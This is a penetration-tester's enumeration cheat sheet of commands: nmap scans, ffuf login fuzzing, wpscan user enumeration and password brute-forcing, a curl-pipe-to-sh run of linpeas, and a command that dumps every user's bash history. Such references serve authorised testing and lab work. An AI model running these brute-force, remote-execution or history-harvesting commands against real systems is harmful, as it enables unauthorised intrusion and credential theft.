# Enumeration

## Network discovery

```bash
nmap -oA network-discovery -sn <CIDR>
```

## TCP service scan

```bash
nmap -p- -sC -sV -oA tcp-scan <TARGET>
```

## FFuF
Post Fuzz
```bash
ffuf -w wordlist.txt -X POST -d "username=admin&password=FUZZ" -u https://target.com/login   
```

## wpscan
Enumerate users
```bash
wpscan --url https://target.com -e u 
```
Brute force passwords
```bash
# Single user with a wordlist
wpscan --url https://target.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# Multiple users
wpscan --url https://target.com --usernames admin,editor,author --passwords passwords.txt
```
## linpeas
Download
```bash
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh
```
In memory execution
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

## Enumerate home directories
bash history for all users
```bash
find /home -type f -name .bash_history -exec cat {} \; 2>/dev/null
```
## Current user

```bash
id
```

## Kernel and architecture

```bash
uname -a
```

## Operating system

```bash
cat /etc/os-release
```

## Network interfaces

```bash
ip a
```

## Routes

```bash
ip route
```

## Listening services

```bash
ss -lntup
```
